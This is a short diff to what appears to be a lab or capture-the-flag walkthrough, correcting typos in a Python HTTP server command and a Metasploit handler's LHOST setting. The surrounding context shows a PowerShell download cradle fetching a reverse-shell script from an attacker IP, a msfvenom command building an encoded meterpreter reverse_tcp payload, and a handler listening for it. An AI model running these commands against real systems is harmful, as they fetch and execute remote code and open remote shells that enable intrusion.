@@ -90,7 +90,7 @@ Net.WebClient).DownloadString('http://10.11.121.104:8000/Invoke-PowerShellTcp.ps
 
 <!-- prettier-ignore-start -->
 ```bash
-python3 - http.server
+python3 -m http.server 8000
 ```
 {: .nolineno }
 <!-- prettier-ignore-end -->
@@ -134,7 +134,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata -e x86/
 ```bash
 msfconsole
 use exploit/multi/handler
-set LOST 10.11.121.104
+set LHOST 10.11.121.104
 set LPORT 4443
 set PAYLOAD windows/meterpreter/reverse_tcp
 run
